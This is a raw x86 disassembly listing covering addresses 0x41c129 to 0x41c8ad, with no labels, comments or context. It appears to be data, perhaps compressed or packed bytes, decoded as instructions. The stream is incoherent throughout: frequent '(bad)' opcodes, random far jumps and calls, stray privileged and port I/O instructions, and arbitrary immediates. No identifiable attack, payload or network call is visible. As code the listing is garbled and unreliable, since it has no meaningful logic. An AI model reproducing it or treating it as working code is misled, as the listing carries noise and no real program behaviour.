  41c129:	jo     0x41c0f3
  41c12b:	jbe    0x41c0fd
  41c12d:	arpl   WORD PTR [edx-0x16f95ca2],di
  41c133:	jns    0x41c153
  41c135:	inc    esi
  41c136:	sub    al,0x40
  41c138:	test   edi,0x38dcac18
  41c13e:	cmc    
  41c13f:	cmp    al,0x31
  41c141:	nop
  41c142:	out    0x91,eax
  41c144:	xchg   edx,eax
  41c145:	mov    bl,0xbc
  41c147:	sbb    eax,0x53cb5cb9
  41c14c:	cli    
  41c14d:	(bad)  
  41c14e:	push   edi
  41c14f:	icebp  
  41c150:	and    bh,bl
  41c152:	xchg   ebp,eax
  41c153:	shl    DWORD PTR [esi-0x1196bd1d],cl
  41c159:	fmul   QWORD PTR [ebp+0x57]
  41c15c:	(bad)  
  41c15d:	jle    0x41c17f
  41c15f:	dec    esp
  41c160:	(bad)  
  41c161:	xor    BYTE PTR [ecx+0x77cfd63c],dh
  41c167:	pop    ebx
  41c168:	adc    al,0xa5
  41c16a:	add    ah,BYTE PTR [ebx+0x3589be3d]
  41c170:	fild   WORD PTR [esi-0x6ac6ca3f]
  41c176:	psrlq  mm2,QWORD PTR [ecx-0x5b724277]
  41c17d:	(bad)  
  41c17f:	aam    0x7c
  41c181:	push   ebp
  41c182:	fabs   
  41c184:	fcmovne st,st(2)
  41c186:	test   al,0x7c
  41c188:	cmp    esp,edi
  41c18a:	inc    eax
  41c18b:	repz shl DWORD PTR [esi],0x4a
  41c18f:	test   ah,bl
  41c191:	sub    eax,0x1e9d294e
  41c196:	and    eax,0x7d794f38
  41c19b:	retf   
  41c19c:	xchg   ecx,eax
  41c19d:	cdq    
  41c19e:	adc    al,0x67
  41c1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1a1:	not    ecx
  41c1a3:	icebp  
  41c1a4:	jne    0x41c1f8
  41c1a6:	sub    BYTE PTR [edi+0x58b48b2d],dh
  41c1ac:	xor    ch,BYTE PTR [eax+edi*2+0x17db8fc0]
  41c1b3:	sar    BYTE PTR [esi],cl
  41c1b5:	(bad)  
  41c1b6:	ret    0xb33e
  41c1b9:	or     bl,BYTE PTR [edi-0x4a]
  41c1bc:	or     al,0x3a
  41c1be:	xor    bh,bh
  41c1c0:	and    BYTE PTR [ecx+0x710b151a],dl
  41c1c6:	jp     0x41c1b3
  41c1c8:	pushw  ds
  41c1ca:	bound  ecx,QWORD PTR [esi-0x36a2ce28]
  41c1d0:	and    eax,0xb9c4d307
  41c1d5:	sbb    al,0x59
  41c1d7:	cmp    esi,DWORD PTR [ebx+0x619b5d8e]
  41c1dd:	inc    ecx
  41c1de:	cdq    
  41c1df:	push   DWORD PTR [ebp-0x4a8d6598]
  41c1e5:	push   ss
  41c1e6:	sbb    edx,DWORD PTR [eax+0x4e]
  41c1e9:	pop    ds
  41c1ea:	cmp    DWORD PTR [edi-0x44a349a7],ecx
  41c1f0:	inc    esp
  41c1f1:	dec    ecx
  41c1f2:	(bad)  
  41c1f3:	mov    edx,0xedc6007c
  41c1f8:	in     al,0xb2
  41c1fa:	jnp    0x41c23b
  41c1fc:	aaa    
  41c1fd:	test   DWORD PTR [edi+ebp*4-0x511597fd],ecx
  41c204:	arpl   WORD PTR ds:0x68d00993,dx
  41c20a:	adc    DWORD PTR [ebp-0x197a72f],0xa7a75d1
  41c214:	into   
  41c215:	sub    ah,BYTE PTR [ebx+0xf]
  41c218:	inc    edx
  41c219:	cli    
  41c21a:	pop    ds
  41c21b:	mov    ecx,0x6e0b88d6
  41c220:	pop    ecx
  41c221:	sub    eax,eax
  41c223:	js     0x41c28d
  41c225:	ror    BYTE PTR [ebp-0x47],cl
  41c228:	test   al,0x50
  41c22a:	and    BYTE PTR [ebx],bl
  41c22c:	dec    edx
  41c22d:	xchg   edx,eax
  41c22e:	push   edi
  41c22f:	mov    esi,0xdecfddb
  41c234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c235:	fmul   QWORD PTR [eax+edi*1]
  41c238:	loopne 0x41c205
  41c23a:	push   edi
  41c23b:	scas   eax,DWORD PTR es:[edi]
  41c23c:	ficomp WORD PTR [eax-0x28e675d8]
  41c242:	stos   DWORD PTR es:[edi],eax
  41c243:	adc    BYTE PTR [esi*1+0x1bff654e],dh
  41c24a:	jmp    0x41c20c
  41c24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c24d:	lahf   
  41c24e:	je     0x41c1f8
  41c250:	(bad)  [ecx]
  41c252:	cwde   
  41c253:	or     al,BYTE PTR [edi]
  41c255:	push   es
  41c256:	jmp    0x41c290
  41c258:	retf   
  41c259:	push   edi
  41c25a:	sbb    DWORD PTR [edi],edi
  41c25c:	cdq    
  41c25d:	xchg   ecx,eax
  41c25e:	pop    es
  41c25f:	mov    eax,0x10ce55f8
  41c264:	stc    
  41c265:	lea    ecx,[edx+0x21]
  41c268:	in     al,0x3c
  41c26a:	inc    ecx
  41c26b:	shl    al,1
  41c26d:	stos   BYTE PTR es:[edi],al
  41c26e:	dec    eax
  41c26f:	xchg   BYTE PTR [edi-0x10],dl
  41c272:	mov    bh,0x95
  41c274:	fadd   st(4),st
  41c276:	lods   al,BYTE PTR ds:[esi]
  41c277:	pop    ebp
  41c279:	xor    al,0x73
  41c27b:	mov    al,ds:0x9fcda167
  41c280:	cld    
  41c281:	outs   dx,BYTE PTR ds:[esi]
  41c282:	push   eax
  41c283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c284:	ret    
  41c285:	cmc    
  41c286:	xor    ebx,0x72
  41c289:	dec    esp
  41c28a:	in     al,dx
  41c28b:	inc    edx
  41c28c:	add    al,0x23
  41c28e:	aam    0x60
  41c290:	push   ds
  41c291:	pop    esi
  41c292:	pushf  
  41c293:	xor    al,0x97
  41c295:	push   eax
  41c296:	test   eax,0xa3d2196d
  41c29b:	sbb    cl,BYTE PTR [eax-0x2162b34f]
  41c2a1:	ja     0x41c228
  41c2a3:	jno    0x41c225
  41c2a5:	cmp    BYTE PTR [ecx+ecx*2+0x2f7549e9],ah
  41c2ac:	pop    edx
  41c2ad:	pop    esi
  41c2ae:	ret    
  41c2af:	or     esi,esi
  41c2b1:	rcl    BYTE PTR [ebx+0x3d50c462],0xd3
  41c2b8:	std    
  41c2b9:	aam    0x15
  41c2bb:	xchg   ebp,eax
  41c2bc:	jmp    0x41c2b7
  41c2be:	das    
  41c2bf:	and    edx,esp
  41c2c1:	int    0xba
  41c2c3:	neg    ecx
  41c2c5:	(bad)  
  41c2c6:	and    eax,0x5e450665
  41c2cb:	lods   al,BYTE PTR ds:[esi]
  41c2cc:	clc    
  41c2cd:	jo     0x41c305
  41c2cf:	lock xchg ecx,eax
  41c2d1:	mov    eax,0x49c9da5f
  41c2d6:	jl     0x41c330
  41c2d8:	pop    DWORD PTR [esi-0xf20f3ef]
  41c2de:	loope  0x41c2b0
  41c2e0:	xchg   ebx,eax
  41c2e1:	push   esp
  41c2e2:	dec    edx
  41c2e3:	jg     0x41c303
  41c2e5:	mov    DWORD PTR [edi+0x3d15c7cd],ecx
  41c2eb:	cmp    al,0x6a
  41c2ed:	scas   al,BYTE PTR es:[edi]
  41c2ee:	adc    BYTE PTR [ebx+ebx*1],dl
  41c2f1:	mov    esp,0x14d043cb
  41c2f6:	dec    ebx
  41c2f7:	mov    ecx,0x27a082ef
  41c2fc:	dec    esi
  41c2fd:	mov    eax,0x44741642
  41c302:	xchg   BYTE PTR [edx+eiz*8-0xbd36f1f],dl
  41c309:	mov    ds:0x5bfaff08,al
  41c30e:	jns    0x41c2cc
  41c310:	retf   0x326b
  41c313:	mov    ch,0xd6
  41c315:	lahf   
  41c316:	or     dh,BYTE PTR [edx+ecx*8+0xebf585d]
  41c31d:	push   0x6d8f1028
  41c322:	sbb    dh,BYTE PTR [eax]
  41c324:	ja     0x41c35b
  41c326:	(bad)  
  41c327:	fdiv   QWORD PTR [eax+0xdf35e6a]
  41c32d:	and    al,0x12
  41c32f:	adc    BYTE PTR [esi+0x7],ch
  41c332:	dec    ebx
  41c333:	add    BYTE PTR [esi-0x2b7377cb],ah
  41c339:	stos   DWORD PTR es:[edi],eax
  41c33a:	xchg   DWORD PTR [ebx+0x6fd6430],ebx
  41c340:	adc    dh,BYTE PTR [edi]
  41c342:	cmp    al,0x75
  41c344:	ja     0x35a21363
  41c34a:	pop    ss
  41c34b:	data16 add ah,BYTE PTR ds:0xe04e2ca1
  41c352:	or     al,0x4f
  41c354:	mov    eax,ds:0x15954eb1
  41c359:	stos   DWORD PTR es:[edi],eax
  41c35a:	not    ecx
  41c35c:	sub    al,0xb5
  41c35e:	cld    
  41c35f:	push   0x84b4e53c
  41c364:	cdq    
  41c365:	ins    DWORD PTR es:[edi],dx
  41c366:	push   cs
  41c367:	add    bh,BYTE PTR [eax-0x68]
  41c36a:	sti    
  41c36b:	loop   0x41c387
  41c36d:	std    
  41c36e:	mov    dl,0x40
  41c370:	mov    ebx,ecx
  41c372:	xchg   esi,eax
  41c373:	dec    eax
  41c374:	cwde   
  41c375:	(bad)  
  41c377:	idiv   BYTE PTR [esi+edx*1+0x1a]
  41c37b:	xor    ecx,esp
  41c37d:	pop    edi
  41c37e:	pop    ecx
  41c37f:	enter  0x7bae,0xce
  41c383:	jno    0x41c31e
  41c385:	aad    0x99
  41c387:	mov    ah,0xc2
  41c389:	xchg   edi,eax
  41c38a:	dec    esp
  41c38b:	sub    al,0xd0
  41c38d:	and    eax,0x5b49dde2
  41c392:	push   ebp
  41c393:	int3   
  41c394:	aad    0xc9
  41c396:	ins    DWORD PTR es:[edi],dx
  41c397:	retf   0x96e7
  41c39a:	fisttp WORD PTR [esi]
  41c39c:	push   edi
  41c39d:	or     ch,cl
  41c39f:	pop    es
  41c3a0:	(bad)  
  41c3a1:	mov    dl,0xbc
  41c3a3:	sbb    eax,0x1271643d
  41c3a8:	cmp    DWORD PTR [ecx+0x1e],ebx
  41c3ab:	xchg   DWORD PTR [ebp+0x46],ebx
  41c3ae:	sahf   
  41c3af:	inc    edi
  41c3b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3b1:	call   0xee70:0xffc43ef7
  41c3b8:	jmp    0x1881:0x355f7eaa
  41c3bf:	mov    ecx,0xc36b4477
  41c3c4:	and    al,0x18
  41c3c6:	adc    al,0x82
  41c3c8:	add    eax,0x775276db
  41c3cd:	and    esi,DWORD PTR [esi]
  41c3cf:	idiv   ah
  41c3d1:	add    eax,0xedd6c170
  41c3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3d7:	mov    dh,0x90
  41c3d9:	mov    ds:0xe3d5f851,eax
  41c3de:	xchg   ebx,eax
  41c3df:	iret   
  41c3e0:	stc    
  41c3e1:	xor    eax,0x4032aaf1
  41c3e6:	dec    edx
  41c3e7:	adc    esi,edx
  41c3e9:	icebp  
  41c3ea:	retf   
  41c3eb:	and    eax,0xaa600fed
  41c3f0:	add    al,0x68
  41c3f2:	mov    bl,0xfa
  41c3f4:	fcomp  QWORD PTR [edi]
  41c3f6:	popa   
  41c3f7:	inc    ebp
  41c3f8:	in     eax,dx
  41c3f9:	imul   esp,DWORD PTR [edx+0x7c25afd9],0xffffffd9
  41c400:	test   eax,0xbbcbc7
  41c405:	dec    ebx
  41c406:	add    esi,DWORD PTR [edi+ebx*8-0x1c]
  41c40a:	pop    ecx
  41c40b:	xchg   ebx,eax
  41c40c:	mov    dh,0xa7
  41c40e:	sbb    edi,edx
  41c410:	call   0x8c0e71d
  41c415:	mov    DWORD PTR [esi+0x151ba6fb],esp
  41c41b:	mov    esp,0x4500b6d9
  41c420:	fnstcw WORD PTR [esi+0x7053b7b4]
  41c426:	cmpxchg BYTE PTR [esi],dh
  41c429:	mov    cl,0xb3
  41c42b:	or     bl,BYTE PTR [eax+ecx*2+0x5b]
  41c42f:	imul   esp,DWORD PTR [ebx+0x3f],0x1faea96a
  41c436:	add    BYTE PTR [esi],ah
  41c438:	adc    esi,ebp
  41c43a:	xchg   edi,eax
  41c43b:	out    0x25,eax
  41c43d:	jl     0x41c401
  41c43f:	stc    
  41c440:	or     edx,DWORD PTR [edi]
  41c442:	lods   eax,DWORD PTR ds:[esi]
  41c443:	(bad)
  41c446:	in     al,dx
  41c447:	les    ecx,FWORD PTR [esi]
  41c449:	push   ebx
  41c44a:	dec    ebp
  41c44b:	sbb    eax,0xded7e221
  41c450:	xor    ch,BYTE PTR [edx+0x7a]
  41c453:	lods   al,BYTE PTR ds:[esi]
  41c454:	hlt    
  41c455:	push   ebx
  41c456:	dec    ebx
  41c457:	ds jo  0x41c4b4
  41c45a:	dec    ebx
  41c45b:	(bad)  
  41c45c:	xor    eax,0x4e81a1b4
  41c461:	cwde   
  41c462:	adc    al,0x5e
  41c464:	or     BYTE PTR [ecx+0x668929c7],0x17
  41c46b:	or     eax,0xf936fe
  41c470:	mov    bh,0x8c
  41c472:	call   0xdcd14876
  41c477:	adc    eax,0x4f138f38
  41c47c:	stos   BYTE PTR es:[edi],al
  41c47d:	push   ebp
  41c47e:	push   ss
  41c47f:	or     ebx,0x8bc25aad
  41c485:	cmp    eax,DWORD PTR [ecx-0x67]
  41c488:	xchg   ecx,eax
  41c489:	(bad)  
  41c48a:	out    dx,al
  41c48b:	repz jmp 0x59b0:0xbe3df233
  41c493:	das    
  41c494:	mov    al,ds:0xb4f74f5b
  41c499:	inc    edx
  41c49a:	jmp    0x3a69c8c7
  41c49f:	test   ecx,eax
  41c4a1:	into   
  41c4a2:	pop    ebx
  41c4a3:	push   ds
  41c4a4:	dec    ebx
  41c4a5:	mov    bh,0x3b
  41c4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4a8:	jmp    0x6c07:0x62f1ec03
  41c4af:	jnp    0x41c4ed
  41c4b1:	(bad)  
  41c4b2:	jle    0x41c4b7
  41c4b4:	(bad)  
  41c4b5:	lock gs jne 0x41c4cd
  41c4b9:	dec    edi
  41c4ba:	sub    al,0x9
  41c4bc:	lods   eax,DWORD PTR ds:[esi]
  41c4bd:	push   ecx
  41c4be:	xor    BYTE PTR [edi-0x43d6c2ad],ch
  41c4c4:	xor    eax,0xe793ddfc
  41c4c9:	inc    esi
  41c4ca:	adc    BYTE PTR [esi-0x6de7a411],bh
  41c4d0:	mov    dh,0x9a
  41c4d2:	test   al,0x9f
  41c4d4:	(bad)  [ebx+0x4a2f3425]
  41c4da:	xchg   esp,eax
  41c4db:	push   edx
  41c4dc:	mov    WORD PTR [eax-0x3c],fs
  41c4df:	xchg   esp,eax
  41c4e0:	hlt    
  41c4e1:	jae    0x41c509
  41c4e3:	mov    ah,0xf0
  41c4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4e6:	xchg   edx,eax
  41c4e7:	pusha  
  41c4e8:	xchg   edx,eax
  41c4e9:	pop    eax
  41c4ea:	ja     0x41c511
  41c4ec:	outs   dx,DWORD PTR ds:[esi]
  41c4ed:	xchg   ecx,eax
  41c4ee:	sbb    al,0xa1
  41c4f0:	js     0x41c4b4
  41c4f2:	inc    ecx
  41c4f3:	jb     0x41c4c7
  41c4f5:	mov    BYTE PTR [eax-0x67e56396],bh
  41c4fb:	cwde   
  41c4fc:	xchg   esp,eax
  41c4fd:	xor    DWORD PTR [ebp-0x229852cb],edi
  41c503:	lock jb 0x41c577
  41c506:	loopne 0x41c52d
  41c508:	leave  
  41c509:	(bad)  
  41c50a:	mov    eax,ds:0x61634b69
  41c50f:	mov    al,0x10
  41c511:	fdivr  QWORD PTR ds:0xb202c713
  41c517:	cwde   
  41c518:	dec    ebx
  41c519:	shl    DWORD PTR [esi],0x1c
  41c51c:	into   
  41c51d:	shl    BYTE PTR [ebp+0x58],1
  41c520:	rcl    BYTE PTR [eax+0x5debc98d],0xba
  41c527:	adc    BYTE PTR [edx+0x4d],0xcb
  41c52b:	lock inc esi
  41c52d:	mov    DWORD PTR [ebp+0x6d],ecx
  41c530:	in     al,0xdc
  41c532:	push   bp
  41c534:	stc    
  41c535:	push   edx
  41c536:	loopne 0x41c547
  41c538:	sub    al,BYTE PTR [ebp-0x7d242d07]
  41c53e:	mov    ds:0xf25eab17,al
  41c543:	push   esi
  41c544:	popa   
  41c545:	push   edx
  41c546:	add    al,0x3c
  41c548:	popf   
  41c549:	push   ebx
  41c54a:	leave  
  41c54b:	stos   DWORD PTR es:[edi],eax
  41c54c:	adc    al,0x2c
  41c54e:	jge    0x41c5a8
  41c550:	sbb    BYTE PTR [edx-0x636eb294],dh
  41c556:	dec    ecx
  41c558:	sbb    dh,BYTE PTR [edx]
  41c55a:	test   bh,0x6d
  41c55d:	imul   ebx,DWORD PTR [ebp-0x65],0x6be8d8a8
  41c564:	cmp    BYTE PTR [ebx+edx*1+0x62ff5acc],bh
  41c56b:	out    dx,al
  41c56c:	iret   
  41c56d:	fwait
  41c56e:	jp     0x41c5b7
  41c570:	add    al,0xc2
  41c572:	mov    ah,0xe6
  41c574:	mov    eax,ds:0xee864d07
  41c579:	ja     0x41c5af
  41c57b:	or     dh,0x28
  41c57e:	push   eax
  41c57f:	pop    esp
  41c580:	sbb    DWORD PTR [edi],esp
  41c582:	out    0x51,eax
  41c584:	mov    esi,0x8f931c58
  41c589:	gs and al,0x4b
  41c58c:	pop    edi
  41c58d:	mov    ebp,0x271ddbed
  41c592:	loop   0x41c585
  41c594:	fisttp QWORD PTR [ebp-0x3f]
  41c597:	mov    al,ds:0x3900d76c
  41c59c:	and    DWORD PTR [edx+0x2235fbc6],esp
  41c5a2:	mov    edx,0xbe4cb9fc
  41c5a7:	cmc    
  41c5a8:	scas   eax,DWORD PTR es:[edi]
  41c5a9:	xchg   ebp,eax
  41c5aa:	rol    ecx,0x9c
  41c5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c5ae:	psubusb mm7,QWORD PTR [esi]
  41c5b1:	iret   
  41c5b2:	icebp  
  41c5b3:	sub    eax,0x35b4d020
  41c5b8:	add    ecx,0x4e
  41c5bb:	sub    eax,0xa93eb065
  41c5c0:	jecxz  0x41c57a
  41c5c2:	and    edx,0xffffff91
  41c5c5:	mov    ds:0x5e916ce3,eax
  41c5ca:	push   esi
  41c5cb:	cmp    DWORD PTR [edi],esp
  41c5cd:	ins    DWORD PTR es:[edi],dx
  41c5ce:	out    dx,eax
  41c5cf:	shl    BYTE PTR [edx-0x314cd6f8],1
  41c5d5:	imul   ecx,DWORD PTR [esi-0x18],0xa2b61781
  41c5dc:	and    ebx,DWORD PTR [esi+0x2c1e648e]
  41c5e2:	bound  esi,QWORD PTR [ecx+0x5d7b5e85]
  41c5e8:	in     al,dx
  41c5e9:	test   al,0x75
  41c5eb:	cs jne 0x41c58b
  41c5ee:	pusha  
  41c5ef:	or     DWORD PTR [esi+0x32],esp
  41c5f2:	sub    DWORD PTR [ebx-0x1ac09fbe],esp
  41c5f8:	cdq    
  41c5f9:	fidivr WORD PTR [esp+esi*1]
  41c5fc:	addr16 stc 
  41c5fe:	xor    al,0x7c
  41c600:	mov    eax,0x6dbd5b8f
  41c605:	mul    edi
  41c607:	ret    0xc1e
  41c60a:	retf   0x9368
  41c60d:	gs into 
  41c60f:	mov    ebp,0x42613d30
  41c614:	(bad)  
  41c616:	sub    ecx,DWORD PTR [ebp+0x73e31919]
  41c61c:	sub    ebp,DWORD PTR ds:0xfd2ee557
  41c622:	shl    BYTE PTR [edi-0x23],1
  41c625:	sbb    dh,al
  41c627:	mov    edx,0xa92421b2
  41c62c:	add    ebx,ebp
  41c62e:	mov    ah,0x3d
  41c630:	inc    ebp
  41c631:	scas   eax,DWORD PTR es:[edi]
  41c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c633:	dec    esp
  41c634:	push   ecx
  41c635:	jge    0x41c67e
  41c637:	mov    ds:0xd9a66884,eax
  41c63c:	cmc    
  41c63d:	rcr    BYTE PTR [esi],1
  41c63f:	and    al,0xf3
  41c641:	ins    BYTE PTR es:[edi],dx
  41c642:	xor    eax,DWORD PTR [eax+eax*8]
  41c645:	imul   esi,DWORD PTR [edi+0x6dd6e920],0x887e7cb7
  41c64f:	std    
  41c650:	ins    BYTE PTR es:[edi],dx
  41c651:	fild   QWORD PTR [edi+0x3b0ea729]
  41c657:	dec    ecx
  41c658:	ins    BYTE PTR es:[di],dx
  41c65a:	mul    DWORD PTR [edx]
  41c65c:	sbb    BYTE PTR [eax-0x10],ch
  41c65f:	test   BYTE PTR [ecx+edi*8-0x5f],cl
  41c663:	sub    ah,BYTE PTR [ebx+0x642b0e4a]
  41c669:	jbe    0x41c68b
  41c66b:	lea    esi,[edi]
  41c66d:	add    bh,BYTE PTR [edi]
  41c66f:	mov    ds:0xaa634761,al
  41c674:	sub    BYTE PTR [edi+0x5a],ah
  41c677:	in     al,dx
  41c678:	rcl    BYTE PTR [bp+si],1
  41c67b:	jae    0x41c6bb
  41c67d:	sbb    BYTE PTR [esp+ebx*1+0x45799cb5],bl
  41c684:	push   eax
  41c685:	aad    0x60
  41c687:	lock test al,0x58
  41c68a:	jge    0x41c6d1
  41c68c:	imul   esi,DWORD PTR [ebx+edx*4],0xfb598a69
  41c693:	jp     0x41c6d9
  41c695:	jae    0x41c643
  41c697:	mov    ds:0xa0a5a875,al
  41c69c:	ror    BYTE PTR [edi],0xdb
  41c69f:	pop    ss
  41c6a0:	mov    WORD PTR [ebp-0x6d1b79ad],gs
  41c6a6:	add    DWORD PTR [ebx-0x64],eax
  41c6a9:	lods   eax,DWORD PTR ds:[esi]
  41c6aa:	push   ebx
  41c6ab:	jbe    0x41c641
  41c6ad:	push   ebp
  41c6ae:	xchg   ecx,eax
  41c6af:	mov    ds:0xa821fba1,eax
  41c6b4:	loope  0x41c6d4
  41c6b6:	popf   
  41c6b7:	xchg   ebx,eax
  41c6b8:	aam    0x93
  41c6ba:	cmp    edx,eax
  41c6bc:	mov    bl,0x9
  41c6be:	xor    eax,0x32e33070
  41c6c3:	les    edi,FWORD PTR [ebx-0x3e]
  41c6c6:	pop    ebp
  41c6c7:	push   0x0
  41c6c9:	adc    eax,0xc427d93
  41c6ce:	and    DWORD PTR [eax],ebx
  41c6d0:	jge    0x41c678
  41c6d2:	mov    ecx,ss
  41c6d4:	pop    ecx
  41c6d5:	mov    bh,0x88
  41c6d7:	add    DWORD PTR [edx+0x73f5a6de],esi
  41c6dd:	or     bh,BYTE PTR [edx+0x6b]
  41c6e0:	(bad)
  41c6e3:	in     eax,0x7f
  41c6e5:	xor    eax,0x5c419f8e
  41c6ea:	push   ebp
  41c6eb:	daa    
  41c6ec:	push   ebp
  41c6ed:	push   ebp
  41c6ee:	add    eax,0x7dec71ce
  41c6f3:	cmp    DWORD PTR [ecx+0x67],edx
  41c6f6:	pop    ecx
  41c6f7:	dec    ecx
  41c6f8:	sbb    eax,0x951921d8
  41c6fd:	aas    
  41c6fe:	sub    eax,0x788bf258
  41c703:	jp     0x41c6c6
  41c705:	xor    al,0xb2
  41c707:	pop    edi
  41c708:	fsubr  QWORD PTR [edx]
  41c70a:	sti    
  41c70b:	sbb    DWORD PTR [ebp+0x4f6b1a0e],ecx
  41c711:	xchg   ecx,eax
  41c712:	xor    BYTE PTR [esi-0x7b120d00],dl
  41c718:	jo     0x41c6ee
  41c71a:	push   ds
  41c71b:	clc    
  41c71c:	int3   
  41c71d:	cwde   
  41c71e:	ret    0x2
  41c721:	xchg   edi,eax
  41c722:	test   al,0xb9
  41c724:	mov    al,ds:0xbf32f0f2
  41c729:	pop    esp
  41c72a:	dec    edx
  41c72b:	dec    eax
  41c72c:	add    al,0x1b
  41c72e:	popa   
  41c72f:	loope  0x41c6f1
  41c731:	jnp    0x41c704
  41c733:	sub    cl,BYTE PTR [ecx]
  41c735:	or     ch,bh
  41c737:	mov    esp,0xc43053c8
  41c73c:	lock inc ebp
  41c73e:	sub    BYTE PTR ds:[ebx],bh
  41c741:	or     DWORD PTR [edi-0x37],0x1dcecab4
  41c748:	mov    edi,0x4c5c66fd
  41c74d:	shl    BYTE PTR [ecx+0x52badceb],1
  41c753:	add    BYTE PTR [ecx],bh
  41c755:	xchg   esi,eax
  41c756:	mov    BYTE PTR [ecx],0x7e
  41c759:	nop
  41c75a:	push   ebx
  41c75b:	add    al,0x8
  41c75d:	or     cl,bl
  41c75f:	shl    BYTE PTR [ebp+0x4f],0xfb
  41c763:	fisub  WORD PTR [eax-0x34e03323]
  41c769:	push   cs
  41c76a:	xchg   BYTE PTR [edi+0x7],dh
  41c76d:	mov    ecx,0x26f8e94e
  41c772:	add    BYTE PTR ds:0x71311ccd,bh
  41c778:	pop    esp
  41c779:	push   edi
  41c77a:	cmp    dh,ah
  41c77c:	ja     0x41c76b
  41c77e:	ins    BYTE PTR es:[edi],dx
  41c77f:	jb     0x41c7b0
  41c781:	je     0x41c7e8
  41c783:	dec    esp
  41c784:	scas   eax,DWORD PTR es:[edi]
  41c785:	fdiv   st(4),st
  41c787:	mov    DWORD PTR [edx+0x58],eax
  41c78a:	inc    eax
  41c78b:	adc    BYTE PTR ds:0x94cba871,dh
  41c791:	sbb    BYTE PTR [esi],0x7c
  41c794:	call   0x754e0d2d
  41c799:	addr16 jno 0x41c80d
  41c79c:	xchg   edi,eax
  41c79d:	mov    BYTE PTR [ecx+eiz*4],cl
  41c7a0:	push   esp
  41c7a1:	sbb    DWORD PTR [edx],esp
  41c7a3:	stos   DWORD PTR es:[edi],eax
  41c7a4:	adc    bh,BYTE PTR [eax+eiz*1+0x7b]
  41c7a8:	pushf  
  41c7a9:	shl    BYTE PTR [ebx+0x4b],cl
  41c7ac:	(bad)  
  41c7ad:	retf   
  41c7ae:	shr    al,1
  41c7b0:	js     0x41c7c8
  41c7b2:	and    ebp,DWORD PTR [ecx+0x16f33bc7]
  41c7b8:	add    ebx,ecx
  41c7ba:	fild   DWORD PTR [esi+eiz*1]
  41c7bd:	(bad)  
  41c7be:	jno    0x41c7d0
  41c7c0:	push   cs
  41c7c1:	mov    ch,0xf1
  41c7c3:	enter  0x500,0x29
  41c7c7:	xchg   DWORD PTR [ecx],esi
  41c7c9:	ret    
  41c7ca:	ss xchg edi,eax
  41c7cc:	mov    ecx,0xda54bd5d
  41c7d1:	ins    BYTE PTR es:[edi],dx
  41c7d2:	jp     0x41c777
  41c7d4:	add    DWORD PTR [ecx],edi
  41c7d6:	bndstx [eax],bnd2
  41c7d9:	xchg   esi,eax
  41c7da:	bound  esp,QWORD PTR [ecx]
  41c7dc:	je     0x41c7fd
  41c7de:	stc    
  41c7df:	mov    ebp,0x68248e1b
  41c7e4:	jecxz  0x41c829
  41c7e6:	cmp    bh,BYTE PTR [eax+0x6c]
  41c7e9:	jb     0x41c852
  41c7eb:	cmp    dh,dh
  41c7ed:	outs   dx,BYTE PTR ds:[esi]
  41c7ee:	in     al,dx
  41c7ef:	imul   ebx,DWORD PTR [eax+ebx*1+0x3ee31241],0xe1bb42e6
  41c7fa:	and    DWORD PTR [edi-0x33],edx
  41c7fd:	add    eax,0xd785ceee
  41c802:	sbb    DWORD PTR [eiz*4+0x37923b08],ebp
  41c809:	outs   dx,DWORD PTR ds:[esi]
  41c80a:	push   ecx
  41c80b:	or     eax,0x98e8b7d1
  41c810:	add    DWORD PTR [edi],0xffffff89
  41c813:	fist   WORD PTR [ecx]
  41c815:	in     al,0x9a
  41c817:	push   ss
  41c818:	xor    al,0xec
  41c81a:	(bad)  
  41c81b:	dec    edi
  41c81c:	arpl   WORD PTR [esi],si
  41c81e:	mov    cl,BYTE PTR [esi+0x3c2c8e64]
  41c824:	test   al,0x34
  41c826:	jmp    0x886c:0x4105b561
  41c82d:	cwde   
  41c82e:	bound  ecx,QWORD PTR [ecx+0x71]
  41c831:	dec    ebx
  41c832:	adc    bl,BYTE PTR [esi+0x72ae6be2]
  41c838:	int3   
  41c839:	mov    ?,WORD PTR [esi]
  41c83b:	mov    dh,0x90
  41c83d:	cmp    cl,BYTE PTR [eax]
  41c83f:	xor    eax,0xedba8511
  41c844:	lds    ecx,FWORD PTR [edx+0x1a]
  41c847:	aaa    
  41c848:	jb     0x41c826
  41c84a:	jns    0x41c876
  41c84c:	fs test al,0xd1
  41c84f:	mov    ?,WORD PTR [ebp+0x2b]
  41c852:	inc    edx
  41c853:	das    
  41c854:	cmc    
  41c855:	cdq    
  41c856:	fstp   TBYTE PTR [esi-0x3fd8ade7]
  41c85c:	and    ebx,edi
  41c85e:	jp     0x41c802
  41c860:	out    0xed,al
  41c862:	(bad)  
  41c863:	pop    ebp
  41c864:	in     eax,dx
  41c865:	sti    
  41c866:	or     BYTE PTR [edx+edi*4+0x55],dh
  41c86a:	cli    
  41c86b:	aaa    
  41c86c:	or     BYTE PTR [eax],0xce
  41c86f:	cmc    
  41c870:	leave  
  41c871:	fucomi st,st(2)
  41c873:	jb     0x41c8db
  41c875:	dec    eax
  41c876:	push   es
  41c877:	adc    BYTE PTR [edx+edi*1+0x73],0x54
  41c87c:	xchg   ebp,eax
  41c87d:	addr16 jmp 0x1763:0x2a6d6a5f
  41c885:	add    ch,BYTE PTR [esi+0x3350eb50]
  41c88b:	hlt    
  41c88c:	or     al,0xd2
  41c88e:	mov    ecx,0x41d5c5b6
  41c893:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c894:	push   ds
  41c895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c896:	jmp    DWORD PTR [esi-0x15]
  41c899:	sbb    ah,BYTE PTR [ebx-0x3b43f266]
  41c89f:	push   ss
  41c8a0:	js     0x41c830
  41c8a2:	adc    BYTE PTR [edi*8+0x4a2421a8],bl
  41c8a9:	mov    ch,0xaa
  41c8ab:	jecxz  0x41c852
  41c8ad:	inc    ebx
